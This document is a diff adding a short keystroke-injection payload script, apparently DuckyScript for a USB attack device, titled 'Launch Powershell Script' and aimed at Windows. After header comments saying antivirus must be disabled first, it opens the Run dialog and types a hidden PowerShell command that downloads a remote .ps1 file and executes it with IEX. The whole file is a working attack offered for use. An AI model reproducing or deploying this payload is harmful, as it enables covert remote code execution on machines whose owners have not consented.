@@ -1,0 +1,14 @@
+REM === Payload Title: Launch Powershell Script ===
+REM Author: Shad Bin Mohd Rizal
+REM Created: 18-10-2025
+REM Purpose: To launch any Powershell script hosted online
+REM Target: Windows environment 
+REM Notes:
+REM - This payload require to disable Windows Defender or any ANtivirus first
+REM - Your .ps1 file must be publicly accessible on the Internet
+
+GUI R
+DELAY 400
+STRING powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest 'url to your .ps1 file' -UseBasicParsing).Content"
+DELAY 400
+ENTER
